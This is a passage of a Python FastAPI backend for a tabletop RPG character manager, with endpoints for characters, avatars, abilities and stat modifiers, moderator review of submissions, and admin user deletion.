    if not before:
        return JSONResponse({"status":"error","message":"Character not found"}, status_code=404)
    if role != "admin" and before.get("owner") != username:
        return JSONResponse({"status":"error","message":"Forbidden"}, status_code=403)

    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"status":"error","message":"Invalid JSON"}, status_code=400)

    name  = (body.get("name") or before.get("name","")).strip()
    stats = body.get("stats", before.get("stats"))
    abilities_in = body.get("abilities", before.get("abilities"))

    updates = {"name": name, "updated_at": datetime.datetime.utcnow().isoformat() + "Z"}
    if "public" in body:
        updates["public"] = _bool_from(body.get("public"))
    if isinstance(stats, dict):
        updates["stats"] = stats
        
    if isinstance(abilities_in, list):
        cleaned: list[str] = []
        for item in abilities_in:
            if isinstance(item, str):
                if item.strip():
                    cleaned.append(item.strip())
            elif isinstance(item, dict) and item.get("id"):
                cleaned.append(str(item["id"]).strip())
        updates["abilities"] = cleaned
    if "ability_choices" in body:
        ac = body.get("ability_choices") or {}
        if isinstance(ac, dict):
            updates["ability_choices"] = ac
    if "item_choices" in body:
        ic = body.get("item_choices") or {}
        if isinstance(ic, dict):
            updates["item_choices"] = ic
    if "xp_ledger" in body:
        ledger = body.get("xp_ledger") or []
        if isinstance(ledger, list):
            updates["xp_ledger"] = ledger

    if "inventory_id" in body:
        inv_id = str(body.get("inventory_id") or "").strip()
        if inv_id:
            inv = get_col("inventories").find_one({"id": inv_id, "owner": before.get("owner")}, {"_id": 1})
            if not inv:
                return JSONResponse({"status": "error", "message": "Inventory not found or not owned by you"}, status_code=400)
        updates["inventory_id"] = inv_id

    if "spell_list_id" in body:
        sl_id = str(body.get("spell_list_id") or "").strip()
        if sl_id:
            sl = get_col("spell_lists").find_one({"id": sl_id, "owner": before.get("owner")}, {"_id": 1})
            if not sl:
                return JSONResponse({"status": "error", "message": "Spell list not found or not owned by you"}, status_code=400)
        updates["spell_list_id"] = sl_id

    if "archetype_id" in body:
        arc_id = str(body.get("archetype_id") or "").strip()
        if arc_id:
            arc = get_col("archetypes").find_one({"id": arc_id}, {"_id":1})
            if not arc:
                return JSONResponse({"status":"error","message":"Archetype not found"}, status_code=400)
            if arc_id != (before.get("archetype_id") or ""):
                errs = _archetype_prereq_errors(arc, updates.get("stats") or before.get("stats") or {})
                if errs:
                    return JSONResponse({"status":"error","message":"Archetype prerequisites not met", "details": errs}, status_code=400)
        updates["archetype_id"] = arc_id

    if "expertise_ids" in body:
        exp_ids = body.get("expertise_ids") or []
        if isinstance(exp_ids, list):
            updates["expertise_ids"] = [str(x).strip() for x in exp_ids if str(x).strip()]

    if "divine_manifestation_ids" in body:
        dima_ids = body.get("divine_manifestation_ids") or []
        if isinstance(dima_ids, list):
            updates["divine_manifestation_ids"] = [str(x).strip() for x in dima_ids if str(x).strip()]

    if "awakening_ids" in body:
        awake_ids = body.get("awakening_ids") or []
        if isinstance(awake_ids, list):
            updates["awakening_ids"] = [str(x).strip() for x in awake_ids if str(x).strip()]

    if "sublimations" in body:
        subs = body.get("sublimations") or []
        if isinstance(subs, list):
            updates["sublimations"] = subs
    if "avatar_id" in body:
        updates["avatar_id"] = str(body.get("avatar_id") or "").strip()

    # Archetype prereq validation is handled client-side for warnings.

    get_col("characters").update_one({"id": cid}, {"$set": updates})
    after = get_col("characters").find_one({"id": cid}, {"_id":0})
    if after:
        lvl = int(after.get("level") or after.get("stats",{}).get("level") or 1)
        arc_id_final = after.get("archetype_id") or ""
        arc_final = get_col("archetypes").find_one({"id": arc_id_final}, {"_id":0}) if arc_id_final else None
        after["archetype_rank"] = _archetype_rank_for_level(lvl)
        if arc_final:
            after["computed_archetype_abilities"] = _compute_archetype_unlocked(arc_final, lvl)
    return {"status":"success","character":after}

@app.post("/characters/{cid}/avatar")
async def upload_avatar(cid: str, request: Request, file: UploadFile = File(...)):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    ch = get_col("characters").find_one({"id": cid})
    if not ch:
        raise HTTPException(status_code=404, detail="Character not found")
    if role != "admin" and ch.get("owner") != username:
        raise HTTPException(status_code=403, detail="Forbidden")
    if not file:
        raise HTTPException(status_code=400, detail="Missing file")
    content_type = file.content_type or ""
    if content_type not in ("image/png","image/jpeg","image/jpg"):
        raise HTTPException(status_code=400, detail="Only PNG/JPEG allowed")
    data = await file.read()
    if len(data) > 2 * 1024 * 1024:
        raise HTTPException(status_code=400, detail="Max file size is 2MB")
    fs = _fs()
    # delete previous
    prev_id = ch.get("avatar_id")
    if prev_id:
        try: fs.delete(ObjectId(prev_id))
        except Exception: pass
    new_id = fs.put(data, filename=file.filename, content_type=content_type, owner=username, character_id=cid)
    get_col("characters").update_one({"id": cid}, {"$set": {"avatar_id": str(new_id), "updated_at": datetime.datetime.utcnow().isoformat()+"Z"}})
    return {"status":"success","avatar_id": str(new_id)}

@app.get("/characters/{cid}/avatar")
def get_avatar(cid: str):
    ch = get_col("characters").find_one({"id": cid}, {"_id":0})
    if not ch:
        raise HTTPException(status_code=404, detail="Character not found")
    av_id = ch.get("avatar_id")
    if not av_id:
        raise HTTPException(status_code=404, detail="No avatar")
    fs = _fs()
    try:
        fh = fs.get(ObjectId(av_id))
    except Exception:
        raise HTTPException(status_code=404, detail="Not found")
    data = fh.read()
    return Response(content=data, media_type=fh.content_type or "image/png")

@app.delete("/characters/{cid}")
def delete_character(cid: str, request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    doc = get_col("characters").find_one({"id": cid})
    if not doc:
        return {"status":"error","message":"Character not found"}
    if role != "admin" and doc.get("owner") != username:
        return {"status":"error","message":"Forbidden"}
    get_col("characters").delete_one({"id": cid})
    return {"status":"success","deleted": cid}

def _load_abilities_by_id(ids: list[str]) -> list[dict]:
    if not ids:
        return []
    col = get_col("abilities")
    docs = list(col.find({"id": {"$in": ids}}, {"_id": 0}))
    # index by id for fast lookup
    idx = {d["id"]: d for d in docs}
    # return in the same order as ids when possible
    out = []
    for i in ids:
        d = idx.get(i)
        if d:
            out.append(d)
    return out

def _flatten_passive_modifiers(ability_docs: list[dict], origin_label: str) -> list[dict]:
    """Extract passive modifiers with their origin info for breakdown."""
    mods = []
    for ab in ability_docs:
        passive = (ab or {}).get("passive") or {}
        for m in (passive.get("modifiers") or []):
            if m.get("choice") or str(m.get("target") or "").startswith("choice:"):
                continue  # skip user-choice modifiers; they are resolved per-character later
            # Some older ability records stored the target under "key".
            # Support both so modifiers are not dropped when flattening.
            target = m.get("target") or m.get("key") or ""
            mods.append({
                "target": target,
                "mode":   (m.get("mode") or "add").lower(),
                "value":  float(m.get("value") or 0),
                "note":   m.get("note", ""),
                "source": ab.get("name", "Ability"),
                "origin": origin_label,
                "ability_id": ab.get("id")
            })
    return mods

def _apply_modifiers(base: dict, modifiers: list[dict]) -> tuple[dict, dict]:

    import copy
    final_stats = copy.deepcopy(base)
    breakdown: dict[str, list[dict]] = {}

    grouped: dict[str, list[dict]] = {}
    for m in modifiers:
        t = m.get("target")
        if not t:
            continue
        grouped.setdefault(t, []).append(m)

    def get_ref(obj, dotted, create=True):
        parts = dotted.split(".")
        cur = obj
        for p in parts[:-1]:
            if p not in cur:
                if not create: return None, None
                cur[p] = {}
            cur = cur[p]
        return cur, parts[-1]

    for target, arr in grouped.items():
        sets = [x for x in arr if (x.get("mode") or "add") == "set"]
        muls = [x for x in arr if (x.get("mode") or "add") == "mul"]
        adds = [x for x in arr if (x.get("mode") or "add") == "add"]
        ordered = sets + muls + adds

        breakdown[target] = [{
            "source": x.get("source"),
            "origin": x.get("origin"),
            "mode": x.get("mode"),
            "value": x.get("value"),
            "note":  x.get("note"),
            "ability_id": x.get("ability_id"),
        } for x in ordered]

        parent, leaf = get_ref(final_stats, target)
        if parent is None:
            continue
        cur_val = parent.get(leaf, 0)

        try:
            cur_val = float(cur_val)
        except Exception:
            cur_val = 0.0

        for m in ordered:
            mode = (m.get("mode") or "add").lower()
            val  = float(m.get("value") or 0)
            if mode == "set":
                cur_val = val
            elif mode == "mul":
                cur_val = cur_val * val
            else:  # add
                cur_val = cur_val + val

        parent[leaf] = int(cur_val) if cur_val.is_integer() else cur_val

    return final_stats, breakdown

@app.get("/characters/{cid}/computed")
def get_character_computed(cid: str, request: Request):
    username, role = require_auth(request, roles=["user", "moderator", "admin"])
    col = get_col("characters")
    ch = col.find_one({"id": cid}, {"_id": 0})
    if not ch:
        raise HTTPException(404, "Character not found")

    base_stats = (ch.get("stats") or {}).copy()

    abil = (ch.get("abilities") or {})
    arch_ids    = [a["id"] for a in (abil.get("archetype") or [])]
    passive_ids = [a["id"] for a in (abil.get("passive") or [])]
    active_ids  = [a["id"] for a in (abil.get("active") or [])]

    arch_docs    = _load_abilities_by_id(arch_ids)
    passive_docs = _load_abilities_by_id(passive_ids)
    active_docs  = _load_abilities_by_id(active_ids)

    mods = []
    mods += _flatten_passive_modifiers(arch_docs,    "Archetype")
    mods += _flatten_passive_modifiers(passive_docs, "Passive")
    mods += _flatten_passive_modifiers(active_docs,  "Active")

    # 3) apply
    final_stats, breakdown = _apply_modifiers(base_stats, mods)

    return {
        "status": "success",
        "base": base_stats,
        "final": final_stats,
        "breakdown": breakdown,
    }

@app.get("/characters/{cid}/computed")
def get_character_computed(cid: str, request: Request):
    username, role = require_auth(request, roles=["user", "moderator", "admin"])
    col = get_col("characters")
    ch = col.find_one({"id": cid}, {"_id": 0})
    if not ch:
        raise HTTPException(404, "Character not found")

    base_stats = (ch.get("stats") or {}).copy()

    abil = (ch.get("abilities") or {})
    arch_ids    = [a["id"] for a in (abil.get("archetype") or [])]
    passive_ids = [a["id"] for a in (abil.get("passive") or [])]
    active_ids  = [a["id"] for a in (abil.get("active") or [])]

    arch_docs    = _load_abilities_by_id(arch_ids)
    passive_docs = _load_abilities_by_id(passive_ids)
    active_docs  = _load_abilities_by_id(active_ids)

    mods = []
    mods += _flatten_passive_modifiers(arch_docs,    "Archetype")
    mods += _flatten_passive_modifiers(passive_docs, "Passive")
    mods += _flatten_passive_modifiers(active_docs,  "Active")   # only passive blocks inside mixed actives

    final_stats, breakdown = _apply_modifiers(base_stats, mods)

    return {
        "status": "success",
        "base": base_stats,
        "final": final_stats,
        "breakdown": breakdown,
    }

# -------------------- Abilities & Traits --------------------
from fastapi import Body, Query

def _ability_doc_from_payload(payload: dict, creator: str) -> dict:
    name = (payload.get("name") or "Unnamed Ability").strip()
    if not name:
        raise HTTPException(status_code=400, detail="Name is required")

    ab_type = (payload.get("type") or "passive").strip().lower()
    if ab_type not in ("active", "passive", "mixed"):
        raise HTTPException(status_code=400, detail="Invalid type")

    source_category = (payload.get("source_category") or "Other").strip()
    source_ref      = (payload.get("source_ref") or "").strip()
    tags = [str(t).strip() for t in (payload.get("tags") or []) if str(t).strip()]
    description = (payload.get("description") or "").strip()

    active_in  = payload.get("active") or {}
    passive_in = payload.get("passive") or {}
    # Archetype-specific metadata (optional)
    archetype_version = int(payload.get("archetype_version") or 1)
    archetype_original_rank = int(payload.get("archetype_original_rank") or 0)
    archetype_replaces = (payload.get("archetype_replaces") or "").strip()

    # --- active part ---
    active_block = None
    if ab_type in ("active", "mixed"):
        activation = (active_in.get("activation") or "Action").strip()
        try:
            rng = int(active_in.get("range") or 0)
        except Exception:
            raise HTTPException(status_code=400, detail="Active range must be an integer")
        aoe = (active_in.get("aoe") or "").strip()

        costs_in = active_in.get("costs") or {}
        def _num(k, d=0):
            v = costs_in.get(k, d)
            try: return int(v or 0)
            except Exception: raise ValueError(k)

        try:
            costs = {"HP":_num("HP"),"EN":_num("EN"),"MP":_num("MP"),"FO":_num("FO"),"MO":_num("MO"),"TX":_num("TX")}
        except ValueError as bad:
            raise HTTPException(status_code=400, detail=f"Cost {bad} must be an integer")

        costs["other_label"] = (costs_in.get("other_label") or "").strip()
        try: costs["other_value"] = int(costs_in.get("other_value") or 0)
        except Exception: costs["other_value"] = 0

        costs_active = bool(active_in.get("costs_active") or active_in.get("cost_active") or False)

        rolls_in = active_in.get("rolls") or []
        rolls = []
        if isinstance(rolls_in, list):
            for r in rolls_in:
                if not isinstance(r, dict):
                    continue
                expr = (r.get("expr") or r.get("expression") or "").strip()
                if not expr:
                    continue
                kind = (r.get("kind") or r.get("reason") or "custom").strip().lower()
                damage_type = (r.get("damage_type") or r.get("damageType") or "").strip()
                label = (r.get("label") or r.get("custom_label") or "").strip()
                rolls.append({
                    "expr": expr,
                    "kind": kind,
                    "damage_type": damage_type,
                    "label": label,
                })
        requires_skill_roll = bool(active_in.get("requires_skill_roll") or active_in.get("skill_roll") or False)
        skill_roll_in = active_in.get("skill_roll_skills") or active_in.get("roll_skills") or []
        skill_roll_skills = []
        if isinstance(skill_roll_in, list):
            skill_roll_skills = [str(s).strip() for s in skill_roll_in if str(s).strip()]
        active_block = {
            "activation": activation,
            "range": rng,
            "aoe": aoe,
            "costs": costs,
            "costs_active": costs_active,
            "rolls": rolls,
            "requires_skill_roll": requires_skill_roll,
            "skill_roll_skills": skill_roll_skills,
        }

    # --- passive part ---
    passive_block = None
    if ab_type in ("passive", "mixed"):
        pdesc = (passive_in.get("description") or "").strip()
        mods_in = passive_in.get("modifiers") or []
        modifiers = []
        for m in mods_in:
            if not isinstance(m, dict):
                continue
            target = (m.get("target") or "").strip()
            if not target: continue
            mode = (m.get("mode") or "add").strip().lower()
            if mode not in ("add","mul","set"): mode = "add"
            try:
                value = float(m.get("value") or 0)
            except Exception:
                raise HTTPException(status_code=400, detail=f"Invalid modifier value for {target}")
            note = (m.get("note") or "").strip()
            choice = _normalize_choice(m.get("choice") if isinstance(m.get("choice"), dict) else None)
            mod = {"target":target,"mode":mode,"value":value,"note":note}
            try:
                level_step = int(m.get("level_step") or 0)
            except Exception:
                level_step = 0
            try:
                level_increment = int(m.get("level_increment") or 1)
            except Exception:
                level_increment = 1
            if level_step > 0:
                mod["level_step"] = level_step
                mod["level_increment"] = max(1, level_increment)
            group = (m.get("group") or "").strip()
            if group:
                mod["group"] = group
                try:
                    gmax = int(m.get("group_max_choices") or m.get("group_max") or 1)
                except Exception:
                    gmax = 1
                mod["group_max_choices"] = max(0, gmax)
            if choice: mod["choice"] = choice
            modifiers.append(mod)
        passive_block = {"description":pdesc,"modifiers":modifiers}

    now = _now_iso()
    return {
        "name": name,
        "name_key": norm_key(name),
        "type": ab_type,
        "source_category": source_category,
        "source_ref": source_ref,
        "tags": tags,
        "description": description,
        "active": active_block,
        "passive": passive_block,
        "creator": creator,
        "created_at": now,
        "updated_at": now,
        "archetype_version": archetype_version,
        "archetype_original_rank": archetype_original_rank,
        "archetype_replaces": archetype_replaces,
    }

@app.post("/abilities")
async def create_ability(request: Request, payload: dict = Body(...)):
    username, role = require_auth(request, roles=["user", "moderator", "admin"])
    if role not in ("moderator", "admin"):
        try:
            doc = _ability_doc_from_payload(payload, username)
        except HTTPException as e:
            return JSONResponse({"status": "error", "message": str(e.detail)}, status_code=e.status_code)
        pending = _create_pending_submission(username, role, "ability", doc)
        return {"status": "pending", "submission": pending}

    col = get_col("abilities")
    try:
        doc = _ability_doc_from_payload(payload, username)
    except HTTPException as e:
        return JSONResponse({"status": "error", "message": str(e.detail)}, status_code=e.status_code)

    doc["id"] = next_id_str("abilities", padding=4)
    col.insert_one(dict(doc))
    doc.pop("_id", None)
    return {"status":"success","ability": doc}

@app.get("/abilities")
def list_abilities(
    request: Request,
    name: str | None = Query(default=None),
    source: str | None = Query(default=None),
    source_ref: str | None = Query(default=None),
    archetype: str | None = Query(default=None),
    typ: str | None = Query(default=None),
    tags: str | None = Query(default=None),
    skill: str | None = Query(default=None),
):
    col = get_col("abilities")
    q: dict = {}
    if name:   q["name"] = {"$regex": name, "$options": "i"}
    if source: q["source_category"] = {"$regex": source, "$options": "i"}
    ref = source_ref or archetype
    if ref:    q["source_ref"] = {"$regex": ref, "$options": "i"}
    if typ:    q["type"] = {"$regex": typ, "$options": "i"}
    if tags:
        raw = [t.strip() for t in tags.split(",") if t.strip()]
        if raw:
            regexes = [re.compile(rf"^{re.escape(t)}$", re.IGNORECASE) for t in raw]
            q["tags"] = {"$in": regexes}
    if skill:
        q["passive.modifiers.target"] = {"$regex": skill, "$options": "i"}
    docs = list(col.find(q, {"_id": 0}))
    docs.sort(key=lambda d: d.get("name","").lower())
    return {"status":"success","abilities": docs}

# ---- define bulk BEFORE the /{aid} route (also add trailing-slash twin) ----
@app.get("/abilities/bulk")
@app.get("/abilities/bulk/")
async def bulk_abilities(
    request: Request,
    ids: str = Query(..., description="Comma-separated ability IDs")
):
    id_list = [s.strip() for s in (ids or "").split(",") if s.strip()]
    if not id_list:
        return {"status":"success","abilities": []}
    col = get_col("abilities")
    docs = list(col.find({"id": {"$in": id_list}}, {"_id": 0}))
    idx = {d["id"]: d for d in docs}
    ordered = [idx[i] for i in id_list if i in idx]
    return {"status":"success","abilities": ordered}

@app.get("/abilities/{aid}")
async def get_ability(aid: str, request: Request):
    doc = get_col("abilities").find_one({"id": aid}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="Not found")
    return {"status":"success","ability": doc}

@app.put("/abilities/{aid}")
async def update_ability(aid: str, request: Request, payload: dict = Body(...)):
    username, role = require_auth(request, roles=["moderator", "admin"])
    col = get_col("abilities")

    existing = col.find_one({"id": aid})
    if not existing:
        raise HTTPException(404, "Ability not found")

    name = (payload.get("name") or existing.get("name") or "Unnamed Ability").strip()
    if not name:
        return JSONResponse({"status":"error","message":"Name is required"}, status_code=400)

    ab_type = (payload.get("type") or existing.get("type") or "passive").strip().lower()
    if ab_type not in ("active","passive","mixed"):
        return JSONResponse({"status":"error","message":"Invalid type"}, status_code=400)

    source_category = (payload.get("source_category") or existing.get("source_category") or "Other").strip()
    source_ref      = (payload.get("source_ref") or existing.get("source_ref") or "").strip()
    tags = [str(t).strip() for t in (payload.get("tags") or existing.get("tags") or []) if str(t).strip()]
    description = (payload.get("description") or existing.get("description") or "").strip()

    active_in  = payload.get("active")  or existing.get("active")  or {}
    passive_in = payload.get("passive") or existing.get("passive") or {}
    archetype_version = int(payload.get("archetype_version") or existing.get("archetype_version") or 1)
    archetype_original_rank = int(payload.get("archetype_original_rank") or existing.get("archetype_original_rank") or 0)
    archetype_replaces = (payload.get("archetype_replaces") or existing.get("archetype_replaces") or "").strip()

    active_block = None
    if ab_type in ("active","mixed"):
        activation = (active_in.get("activation") or "Action").strip()
        try:
            rng = int(active_in.get("range") or 0)
        except Exception:
            return JSONResponse({"status":"error","message":"Active range must be an integer"}, status_code=400)
        aoe = (active_in.get("aoe") or "").strip()
        costs_in = active_in.get("costs") or {}
        def _num(k,d=0):
            v = costs_in.get(k,d)
            try: return int(v or 0)
            except Exception: raise ValueError(k)
        try:
            costs = {"HP":_num("HP"),"EN":_num("EN"),"MP":_num("MP"),"FO":_num("FO"),"MO":_num("MO"),"TX":_num("TX")}
        except ValueError as bad:
            return JSONResponse({"status":"error","message":f"Cost {bad} must be an integer"}, status_code=400)
        costs["other_label"] = (costs_in.get("other_label") or "").strip()
        try: costs["other_value"] = int(costs_in.get("other_value") or 0)
        except Exception: costs["other_value"] = 0
        costs_active = bool(active_in.get("costs_active") or active_in.get("cost_active") or existing.get("active", {}).get("costs_active") or False)

        rolls_in = active_in.get("rolls") or existing.get("active", {}).get("rolls") or []
        rolls = []
        if isinstance(rolls_in, list):
            for r in rolls_in:
                if not isinstance(r, dict):
                    continue
                expr = (r.get("expr") or r.get("expression") or "").strip()
                if not expr:
                    continue
                kind = (r.get("kind") or r.get("reason") or "custom").strip().lower()
                damage_type = (r.get("damage_type") or r.get("damageType") or "").strip()
                label = (r.get("label") or r.get("custom_label") or "").strip()
                rolls.append({
                    "expr": expr,
                    "kind": kind,
                    "damage_type": damage_type,
                    "label": label,
                })
        requires_skill_roll = bool(active_in.get("requires_skill_roll") or active_in.get("skill_roll") or existing.get("active", {}).get("requires_skill_roll") or False)
        skill_roll_in = active_in.get("skill_roll_skills")
        if skill_roll_in is None:
            skill_roll_in = existing.get("active", {}).get("skill_roll_skills") or existing.get("active", {}).get("roll_skills") or []
        skill_roll_skills = []
        if isinstance(skill_roll_in, list):
            skill_roll_skills = [str(s).strip() for s in skill_roll_in if str(s).strip()]
        active_block = {
            "activation": activation,
            "range": rng,
            "aoe": aoe,
            "costs": costs,
            "costs_active": costs_active,
            "rolls": rolls,
            "requires_skill_roll": requires_skill_roll,
            "skill_roll_skills": skill_roll_skills,
        }

    passive_block = None
    if ab_type in ("passive","mixed"):
        pdesc = (passive_in.get("description") or "").strip()
        mods_in = passive_in.get("modifiers") or []
        modifiers = []
        for m in mods_in:
            if not isinstance(m, dict):
                continue
            target = (m.get("target") or "").strip()
            if not target: continue
            mode = (m.get("mode") or "add").strip().lower()
            if mode not in ("add","mul","set"): mode = "add"
            try:
                value = float(m.get("value") or 0)
            except Exception:
                return JSONResponse({"status":"error","message":f"Invalid modifier value for {target}"}, status_code=400)
            note = (m.get("note") or "").strip()
            choice = _normalize_choice(m.get("choice") if isinstance(m.get("choice"), dict) else None)
            mod = {"target":target,"mode":mode,"value":value,"note":note}
            try:
                level_step = int(m.get("level_step") or 0)
            except Exception:
                level_step = 0
            try:
                level_increment = int(m.get("level_increment") or 1)
            except Exception:
                level_increment = 1
            if level_step > 0:
                mod["level_step"] = level_step
                mod["level_increment"] = max(1, level_increment)
            group = (m.get("group") or "").strip()
            if group:
                mod["group"] = group
                try:
                    gmax = int(m.get("group_max_choices") or m.get("group_max") or 1)
                except Exception:
                    gmax = 1
                mod["group_max_choices"] = max(0, gmax)
            if choice:
                mod["choice"] = choice
            modifiers.append(mod)
        passive_block = {"description":pdesc,"modifiers":modifiers}

    now = datetime.datetime.utcnow().isoformat()+"Z"
    updated = {
        "name": name,
        "name_key": norm_key(name),
        "type": ab_type,
        "source_category": source_category,
        "source_ref": source_ref,
        "tags": tags,
        "description": description,
        "active": active_block,
        "passive": passive_block,
        "updated_at": now,
        "archetype_version": archetype_version,
        "archetype_original_rank": archetype_original_rank,
        "archetype_replaces": archetype_replaces,
    }
    col.update_one({"id": aid}, {"$set": updated})
    existing.update(updated)
    existing.pop("_id", None)
    return {"status":"success","ability": existing}

def _delete_ability_and_references(aid: str):
    """Delete an ability and clean up common references on characters."""
    col = get_col("abilities")
    res = col.delete_one({"id": aid})
    if res.deleted_count == 0:
        raise HTTPException(404, "Ability not found")
    # Remove from character ability arrays and clear related choices
    chars = get_col("characters")
    unset_field = {f"ability_choices.{aid}": ""}
    chars.update_many({}, {"$pull": {"abilities": aid}, "$unset": unset_field})
    return {"status": "success", "deleted": aid}

@app.delete("/abilities/{aid}")
async def delete_ability(aid: str, request: Request):
    username, role = require_auth(request, roles=["moderator", "admin"])
    return _delete_ability_and_references(aid)

@app.post("/abilities/delete")
async def delete_ability_fallback(request: Request):
    username, role = require_auth(request, roles=["moderator", "admin"])
    try:
        body = await request.json()
    except Exception:
        body = {}
    aid = (body.get("id") or "").strip()
    if not aid:
        raise HTTPException(400, "id required")
    return _delete_ability_and_references(aid)


# ---------- Pending submissions ----------
@app.get("/submissions/mine")
def my_submissions(request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    col = get_col("pending_submissions")
    docs = list(col.find({"submitter": username}, {"_id": 0}))
    docs.sort(key=lambda d: d.get("created_at",""), reverse=True)
    return {"status": "success", "submissions": docs}

@app.get("/submissions")
def list_submissions(request: Request, type: str | None = Query(default=None), status: str | None = Query(default=None), kind: str | None = Query(default=None)):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    _ensure_moderator(role)
    col = get_col("pending_submissions")
    q: dict = {}
    if type:
        q["type"] = type.strip().lower()
    if status:
        q["status"] = status.strip().lower()
    if kind:
        q["kind"] = kind.strip().lower()
    docs = list(col.find(q, {"_id": 0}))
    docs.sort(key=lambda d: d.get("created_at",""), reverse=True)
    return {"status": "success", "submissions": docs}

@app.post("/submissions/{sid}/reject")
async def reject_submission(sid: str, request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    _ensure_moderator(role)
    col = get_col("pending_submissions")
    sub = col.find_one({"id": sid})
    if not sub:
        raise HTTPException(status_code=404, detail="Submission not found")
    if sub.get("status") != "pending":
        raise HTTPException(status_code=400, detail="Submission already reviewed")
    body = await request.json() if request.method == "POST" else {}
    note = (body.get("note") or "").strip() if isinstance(body, dict) else ""
    now = _now_iso()
    col.update_one({"id": sid}, {"$set": {
        "status": "rejected",
        "reviewed_by": username,
        "reviewed_at": now,
        "review_note": note,
        "updated_at": now,
    }})
    return {"status": "success", "submission": sid, "result": "rejected"}

@app.post("/submissions/{sid}/approve")
async def approve_submission(sid: str, request: Request):
    username, role = require_auth(request, roles=["user","moderator","admin"])
    _ensure_moderator(role)
    col = get_col("pending_submissions")
    sub = col.find_one({"id": sid})
    if not sub:
        raise HTTPException(status_code=404, detail="Submission not found")
    if sub.get("status") != "pending":
        raise HTTPException(status_code=400, detail="Submission already reviewed")
    sub_type = (sub.get("type") or "").strip().lower()
    kind = (sub.get("kind") or "").strip().lower()
    payload = sub.get("payload") or {}
    now = _now_iso()

    approved_id = None
    if sub_type == "ability":
        doc = _ability_doc_from_payload(payload, sub.get("submitter") or username)
        doc["id"] = next_id_str("abilities", padding=4)
        doc["created_at"] = now
        doc["updated_at"] = now
        get_col("abilities").insert_one(dict(doc))
        approved_id = doc["id"]
    elif sub_type == "archetype":
        doc = _validate_archetype_doc(payload or {})
        doc["id"] = next_id_str("archetypes", padding=4)
        doc["created_at"] = now
        doc["updated_at"] = now
        get_col("archetypes").insert_one(dict(doc))
        approved_id = doc["id"]
    elif sub_type == "expertise":
        doc = _validate_expertise_doc(payload or {})
        doc["id"] = next_id_str("expertise", padding=4)
        doc["created_at"] = now
        doc["updated_at"] = now
        get_col("expertise").insert_one(dict(doc))
        approved_id = doc["id"]
    elif sub_type == "divine_manifestation":
        doc = _validate_divine_manifestation_doc(payload or {})
        doc["id"] = next_id_str("divine_manifestations", padding=4)
        doc["created_at"] = now
        doc["updated_at"] = now
        get_col("divine_manifestations").insert_one(dict(doc))
        approved_id = doc["id"]
    elif sub_type == "awakening":
        doc = _validate_awakening_doc(payload or {})
        doc["id"] = next_id_str("awakenings", padding=4)
        doc["created_at"] = now
        doc["updated_at"] = now
        get_col("awakenings").insert_one(dict(doc))
        approved_id = doc["id"]
    elif sub_type == "upgrade":
        doc = _upgrade_from_body(payload or {})
        up_col = get_col("upgrades")
        if up_col.find_one({"name_key": doc["name_key"], "kind": doc["kind"], "slot": doc.get("slot","")}):
            raise HTTPException(status_code=409, detail="Duplicate upgrade")
        doc["id"] = next_id_str("upgrade", padding=4)
        doc["created_at"] = now
        doc["updated_at"] = now
        up_col.insert_one(dict(doc))
        approved_id = doc["id"]
    elif sub_type == "item":
        if kind == "weapon":
            doc = _weapon_from_body(payload or {})
            col_items = get_col("weapons")
            if col_items.find_one({"name_key": doc["name_key"]}):
                raise HTTPException(status_code=409, detail="Weapon with same name already exists")
            doc["id"] = next_id_str("weapons", padding=4)
        elif kind == "equipment":
            doc = _equipment_from_body(payload or {})
            col_items = get_col("equipment")
            if col_items.find_one({"category": doc["category"], "name_key": doc["name_key"]}):
                raise HTTPException(status_code=409, detail="Equipment with same name already exists")
            doc["id"] = next_id_str("equipment", padding=4)
        elif kind == "tool":
            doc = _tool_from_body(payload or {})
            col_items = get_col("tools")
            if col_items.find_one({"name_key": doc["name_key"]}):
                raise HTTPException(status_code=409, detail="Tool with same name already exists")
            doc["id"] = next_id_str("tools", padding=4)
        else:
            doc = _object_from_body(payload or {})
            col_items = get_col("objects")
            doc["id"] = next_id_str("objects", padding=4)
        doc["created_at"] = now
        col_items.insert_one(dict(doc))
        if kind == "weapon":
            anim = _make_animarma(doc)
            if not col_items.find_one({"name_key": anim["name_key"]}):
                anim["id"] = next_id_str("weapons", padding=4)
                anim["created_at"] = now
                col_items.insert_one(dict(anim))
        approved_id = doc["id"]
    else:
        raise HTTPException(status_code=400, detail="Unknown submission type")

    col.update_one({"id": sid}, {"$set": {
        "status": "approved",
        "reviewed_by": username,
        "reviewed_at": now,
        "approved_id": approved_id,
        "updated_at": now,
    }})
    return {"status": "success", "submission": sid, "approved_id": approved_id}


# --- Admin: delete user ---
@app.delete("/admin/users/{target_username}")
async def admin_delete_user(target_username: str, request: Request):
    admin_username, _ = require_auth(request, roles=["admin"])
    users = get_col("users")
    r = users.delete_one({"username": target_username})
    if r.deleted_count == 0:
        return JSONResponse({"status": "error", "message": "User not found."}, status_code=404)
    write_audit("delete_user", admin_username, spell_id="?", before={"user": target_username}, after=None)
    return {"status":"success","username": target_username}
